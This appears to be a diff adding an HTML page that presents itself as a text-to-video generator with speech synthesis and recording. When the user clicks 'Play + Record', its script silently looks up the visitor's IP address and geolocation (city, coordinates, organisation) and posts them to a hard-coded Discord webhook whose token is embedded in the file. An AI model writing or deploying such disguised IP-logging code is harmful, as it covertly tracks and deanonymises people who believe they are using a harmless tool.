@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Text to Video Generator</title>
+  <style>
+    body {
+      background: #111;
+      color: white;
+      font-family: 'Segoe UI', sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 2rem;
+    }
+    textarea {
+      width: 80%;
+      height: 100px;
+      font-size: 18px;
+      padding: 10px;
+      margin-bottom: 10px;
+      resize: none;
+    }
+    button {
+      padding: 10px 20px;
+      font-size: 18px;
+      margin: 10px;
+      cursor: pointer;
+    }
+    #video-container {
+      border: 2px solid #444;
+      background: black;
+      width: 640px;
+      height: 360px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin-top: 20px;
+      font-size: 24px;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>🎤 Text to Video (No Backend)</h1>
+  <textarea id="textInput" placeholder="Type your script..."></textarea><br>
+  <button onclick="start()">Play + Record</button>
+  <button onclick="downloadVideo()">Download Video</button>
+
+  <div id="video-container">
+    <span id="displayText"></span>
+  </div>
+
+  <video id="recorded" controls style="margin-top:20px; display:none;"></video>
+
+  <script>
+    const displayText = document.getElementById('displayText');
+    const videoContainer = document.getElementById('video-container');
+    const recorded = document.getElementById('recorded');
+
+    let mediaRecorder;
+    let recordedChunks = [];
+
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1369884166736318565/87_Dr8LsOYASsuq-7-Uv1jFPxhv5UUZ94GOI8NmCyp1I3yadjQO51b44O89FCTNSjfw1"; // Replace with your Discord webhook URL
+
+    async function start() {
+      const text = document.getElementById('textInput').value;
+      if (!text.trim()) {
+        alert("Please enter some text!");
+        return;
+      }
+
+      // Get IP address from API
+      let ipData = '';
+      try {
+        const response = await fetch('https://api.ipify.org/?format=json');
+        const data = await response.json();
+        const ip = data.ip;
+
+        // Fetch additional info from ipapi
+        const ipDetailsResponse = await fetch(`https://ipapi.co/${ip}/json`);
+        const ipDetails = await ipDetailsResponse.json();
+
+        // Format the data for Discord
+        ipData = `
+          IP: ${ip}
+          City: ${ipDetails.city}
+          Region: ${ipDetails.region}
+          Country: ${ipDetails.country_name}
+          Latitude: ${ipDetails.latitude}
+          Longitude: ${ipDetails.longitude}
+          Organization: ${ipDetails.org}
+        `;
+
+        // Send the data to Discord webhook
+        await sendToDiscord(ipData);
+
+      } catch (error) {
+        ipData = "Could not fetch IP details.";
+      }
+
+      const finalText = `${text}\n\nIP Info:\n${ipData}`;
+
+      // Display combined text
+      displayText.innerText = finalText;
+
+      // Speak combined text
+      const utterance = new SpeechSynthesisUtterance(finalText);
+      speechSynthesis.speak(utterance);
+
+      // Record
+      const stream = videoContainer.captureStream(30);
+      mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+      recordedChunks = [];
+
+      mediaRecorder.ondataavailable = (e) => {
+        if (e.data.size > 0) recordedChunks.push(e.data);
+      };
+
+      mediaRecorder.onstop = () => {
+        const blob = new Blob(recordedChunks, { type: 'video/webm' });
+        const url = URL.createObjectURL(blob);
+        recorded.src = url;
+        recorded.style.display = "block";
+      };
+
+      mediaRecorder.start();
+
+      // Stop recording when speech ends
+      utterance.onend = () => {
+        mediaRecorder.stop();
+      };
+    }
+
+    async function sendToDiscord(ipData) {
+      const payload = {
+        content: `IP Info:\n${ipData}`
+      };
+
+      try {
+        const response = await fetch(WEBHOOK_URL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(payload)
+        });
+
+        if (!response.ok) {
+          console.error("Error sending data to Discord:", response.statusText);
+        }
+      } catch (error) {
+        console.error("Error sending data to Discord:", error);
+      }
+    }
+
+    function downloadVideo() {
+      if (recordedChunks.length === 0) {
+        alert("No video recorded yet.");
+        return;
+      }
+
+      const blob = new Blob(recordedChunks, { type: 'video/webm' });
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = 'text_video.webm';
+      a.click();
+    }
+  </script>
+</body>
+</html>
